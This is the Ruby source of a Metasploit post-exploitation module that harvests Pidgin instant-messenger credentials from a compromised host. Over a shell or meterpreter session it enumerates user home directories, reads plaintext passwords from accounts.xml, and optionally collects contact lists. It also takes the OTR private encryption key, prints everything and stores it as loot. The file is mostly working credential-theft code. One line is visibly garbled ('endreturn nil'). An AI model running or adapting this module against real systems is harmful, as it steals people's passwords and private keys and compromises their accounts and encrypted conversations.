##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'
require 'rexml/document'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Windows::UserProfiles

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather Pidgin Instant Messenger Credential Collection',
      'Description'    => %q{
        This module will collect credentials from the Pidgin IM client if it is installed.
        },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'bannedit', # post port, added support for shell sessions
          'Carlos Perez <carlos_perez[at]darkoperator.com>' # original meterpreter script
        ],
      'Platform'       => %w{ bsd linux osx unix win },
      'SessionTypes'   => ['shell', 'meterpreter' ]
    ))
    register_options(
      [
        OptBool.new('CONTACTS', [false, 'Collect contact lists?', false]),
        # Not supported yet OptBool.new('LOGS', [false, 'Gather log files?', false]),
      ], self.class)
  end

# TODO add support for collecting logs
  def run
    paths = []
    case session.platform
    when /unix|linux|bsd/
      @platform = :unix
      paths = enum_users_unix
    when /osx/
      @platform = :osx
      paths = enum_users_unix
    when /win/
      @platform = :win
      profiles = grab_user_profiles()
      profiles.each do |user|
        next if user['AppData'] == nil
        pdir = check_pidgin(user['AppData'])
        paths << pdir if pdir
      end
    else
      print_error "Unsupported platform #{session.platform}"
      return
    end
    if paths.nil? or paths.empty?
      print_status("No users found with a .purple directory")
      return
    end

    get_pidgin_creds(paths)

  end

  def enum_users_unix
    if @platform == :osx
      home = "/Users/"
    else
      home = "/home/"
    end

    if got_root?
      userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
      userdirs << "/root\n"
    else
      userdirs = session.shell_command("ls #{home}#{whoami}/.purple")
      if userdirs =~ /No such file/i
        return
      else
        print_status("Found Pidgin profile for: #{whoami}")
        return ["#{home}#{whoami}/.purple"]
      end
    end

    paths = Array.new
    userdirs.each_line do |dir|
      dir.chomp!
      next if dir == "." || dir == ".."

      dir = "#{home}#{dir}" if dir !~ /root/
      print_status("Checking for Pidgin profile in: #{dir}")

      stat = session.shell_command("ls #{dir}/.purple")
      next if stat =~ /No such file/i
      paths << "#{dir}/.purple"
    end
    return paths
  end



  def check_pidgin(purpledir)
    path = ""
    print_status("Checking for Pidgin profile in: #{purpledir}")
    session.fs.dir.foreach(purpledir) do |dir|
      if dir =~ /\.purple/
        if @platform == :win
          print_status("Found #{purpledir}\\#{dir}")
          path = "#{purpledir}\\#{dir}"
        else
          print_status("Found #{purpledir}/#{dir}")
          path = "#{purpledir}/#{dir}"
        end
        return path
      end
    end
    return nil
    endreturn nil
  end

  def get_pidgin_creds(paths)
    case paths
      when /#{@user}\\(.*)\\/
        sys_user = $1
      when /home\/(.*)\//
        sys_user = $1
    end

    data = ""
    credentials = Rex::Ui::Text::Table.new(
    'Header'    => "Pidgin Credentials",
    'Indent'    => 1,
    'Columns'   =>
    [
      "System User",
      "Username",
      "Password",
      "Protocol",
      "Server",
      "Port"
    ])

    buddylists = Rex::Ui::Text::Table.new(
    'Header'    => "Pidgin Contact List",
    'Indent'    => 1,
    'Columns'   =>
    [
      "System User",
      "Buddy Name",
      "Alias",
      "Protocol",
      "Account"
    ])

    paths.each do |path|
      print_status("Reading accounts.xml file from #{path}")
      if session.type == "shell"
        type = :shell
        data = session.shell_command("cat #{path}/accounts.xml")
      else
        type = :meterp
        accounts = session.fs.file.new("#{path}\\accounts.xml", "rb")
        until accounts.eof?
          data << accounts.read
        end
      end

      creds = parse_accounts(data)

      if datastore['CONTACTS']
        blist = ""
        case type
        when :shell
          blist = session.shell_command("cat #{path}/blist.xml")
        when :meterp
          buddyxml = session.fs.file.new("#{path}/blist.xml", "rb")
          until buddyxml.eof?
            blist << buddyxml.read
          end
        end

        buddies = parse_buddies(blist)
        end

      creds.each do |cred|
        credentials << [sys_user, cred['user'], cred['password'], cred['protocol'], cred['server'], cred['port']]
      end

      if buddies
        buddies.each do |buddy|
          buddylists << [sys_user, buddy['name'], buddy['alias'], buddy['protocol'], buddy['account']]
        end
      end

      #Grab otr.private_key
      otr_key = ""
      if session.type == "shell"
        otr_key = session.shell_command("cat #{path}/otr.private_key")
      else
        key_file = "#{path}/otr.private_key"
        otrkey = session.fs.file.stat(key_file) rescue nil
        if otrkey
          f = session.fs.file.new(key_file, "rb")
          until f.eof?
            otr_key << f.read
          end
        else
          otr_key = "No such file"
        end
      end

      if otr_key !~ /No such file/
        print_status("OTR Key: #{otr_key.to_s}")
        store_loot("otr.private_key", "text/plain", session, otr_key.to_s, "otr.private_key", "otr.private_key")
      end


    end

    if datastore['CONTACTS']
      store_loot("pidgin.contacts", "text/plain", session, buddylists.to_csv, "pidgin_contactlists.txt", "Pidgin Contacts")
    end

    store_loot("pidgin.creds", "text/plain", session, credentials.to_csv, "pidgin_credentials.txt", "Pidgin Credentials")
  end

  def parse_accounts(data)

    creds = []
    doc = REXML::Document.new(data).root

    doc.elements.each("account") do |sub|
      account = {}
      if sub.elements['password']
        account['password'] = sub.elements['password'].text
      else
        account['password'] = "<unknown>"
      end

      account['protocol'] = sub.elements['protocol'].text rescue "<unknown>"
      account['user'] = sub.elements['name'].text rescue "<unknown>"
      account['server'] = sub.elements['settings'].elements["setting[@name='server']"].text rescue "<unknown>"
      account['port'] = sub.elements['settings'].elements["setting[@name='port']"].text rescue "<unknown>"
      creds << account

      print_status("Collected the following credentials:")
      print_status("    Server: %s:%s" % [account['server'], account['port']])
      print_status("    Protocol: %s" % account['protocol'])
      print_status("    Username: %s" % account['user'])
      print_status("    Password: %s" % account['password'])
      print_line("")
    end

    return creds
  end

  def parse_buddies(data)
    buddies = []

    doc = REXML::Document.new(data).root
    doc.elements['blist'].elements.each('group') do |group|
      group.elements.each('contact') do |bcontact|
        contact = {}
        contact['name'] = bcontact.elements['buddy'].elements['name'].text rescue "<unknown>"
        contact['account'] = bcontact.elements['buddy'].attributes['account'] rescue "<unknown>"
        contact['protocol'] = bcontact.elements['buddy'].attributes['proto'] rescue "<unknown>"

        if bcontact.elements['buddy'].elements['alias']
          contact['alias'] = bcontact.elements['buddy'].elements['alias'].text
        else
          contact['alias'] = "<unknown>"
        end

        buddies << contact
        print_status("Collected the following contacts:")
        print_status("    Buddy Name: %s" % contact['name'])
        print_status("    Alias: %s" % contact['alias'])
        print_status("    Protocol: %s"  % contact['protocol'])
        print_status("    Account: %s"  % contact['account'])
        print_line("")
      end
    end

    return buddies
  end

  def got_root?
    case @platform
    when :windows
      if session.sys.config.getuid =~ /SYSTEM/
        return true
      else
        return false
      end
    else # unix, bsd, linux, osx
      ret = whoami
      if ret =~ /root/
        return true
      else
        return false
      end
    end
  end

  def whoami
    if @platform == :windows
      session.sys.config.getenv('USERNAME')
    else
      session.shell_command("whoami").chomp
    end
  end
end
